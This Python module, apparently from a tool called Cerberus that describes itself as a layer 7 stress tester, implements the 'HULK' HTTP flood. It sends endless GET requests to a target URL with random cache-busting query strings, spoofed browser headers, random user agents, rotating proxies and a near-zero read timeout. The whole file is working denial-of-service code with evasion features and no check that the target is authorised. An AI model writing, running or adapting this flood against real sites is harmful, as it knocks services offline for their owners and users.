'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''
import time, requests

from src.core import Core
from src.utils import *
from src.useragent import *

def urlsuffix(url) -> str:
    '''
    urlsuffix(target url) -> url with data appended

    Appends a random search query to the url

    :param url str: Target url
    :returns str: Url with data appended
    '''

    url=url.rstrip('/')
    data = f"?{str(randint(1,1000))}={str(randint(1,1000))}"

    return f'{url}/{data}'

def flood(attack_id, url, stoptime) -> None:

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        headers = {
            "Upgrade-Insecure-Requests": "1",
            "Dnt": "1",
            "User-Agent": getAgent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": getReferer(),
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Keep-Alive": str(randint(100, 300))
        }
        
        try:
            Core.session.get(
                urlsuffix(url), 
                headers=headers,
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None,
                proxies=utils().get_proxy()
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'HULK': {
        'info': 'HTTP Unbearable Load King',
        'func': flood
    }
})